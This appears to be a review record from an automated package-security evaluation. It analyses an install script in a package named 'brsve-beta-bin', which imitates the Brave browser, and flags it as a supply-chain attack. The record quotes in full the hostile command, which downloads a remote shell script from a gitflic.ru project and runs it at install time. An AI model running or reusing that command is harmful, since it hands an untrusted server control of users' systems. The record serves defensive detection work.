This is a classic `curl | bash` supply-chain risk: the content is fetched from an external location at install time, is not integrity-checked, and may change between package builds or installations.

Even if the remote script is claimed to be related to the package's upstream, executing it at install time bypasses the package manager's source/checksum verification and gives the remote server full control over the installation context. This is genuinely malicious or at minimum a severe supply-chain injection vector, and it goes far beyond standard packaging practice.

data.reasoning: Both models independently identified the same critical security issue: the brsve-beta-bin.install file contains a top-level command that downloads and executes a remote shell script via `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. This is a textbook supply-chain attack pattern - executing arbitrary code from an untrusted third-party source (gitflic.ru user 'hellscripter') that has no legitimate relationship to the Brave browser package. This code runs during package installation, bypassing all integrity checks. The finding is unambiguous and both models correctly classified it as malicious injection.
learnings: Both models correctly identified the curl|bash pattern in .install scripts as a critical supply-chain risk
